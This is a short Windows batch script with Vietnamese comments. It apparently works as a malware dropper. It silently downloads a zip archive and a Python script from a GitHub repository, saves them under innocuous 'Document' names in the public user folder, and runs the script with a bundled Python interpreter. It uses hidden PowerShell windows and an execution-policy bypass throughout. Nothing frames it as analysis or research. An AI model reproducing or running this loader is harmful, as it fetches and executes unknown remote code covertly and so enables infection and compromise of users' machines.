@echo off
setlocal enabledelayedexpansion


:: Kiểm tra nếu tệp Document.zip không tồn tại, sau đó tải nó về
if not exist "C:\Users\Public\Document.zip" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/vipmodz13/Bot13/raw/main/PythonLib.zip', 'C:\Users\Public\Document.zip')"
)

:: Kiểm tra nếu thư mục Document không tồn tại, sau đó giải nén tệp Document.zip
if not exist "C:\Users\Public\Document" (
    powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "Expand-Archive -Path 'C:\Users\Public\Document.zip' -DestinationPath 'C:\Users\Public\Document'"
)

:: Kiểm tra nếu tệp project.py không tồn tại, sau đó tải nó về
if not exist "C:\Users\Public\Document\project.py" (
    powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/vipmodz13/Bot13/raw/main/project.py', 'C:\Users\Public\Document\project.py')"
)

:: Chạy tệp project.py
powershell.exe -NonInteractive -NoProfile -WindowStyle Hidden -Command "C:\Users\Public\Document\python.exe C:\Users\Public\Document\project.py"

:: Kết thúc script
endlocal
exit /b 0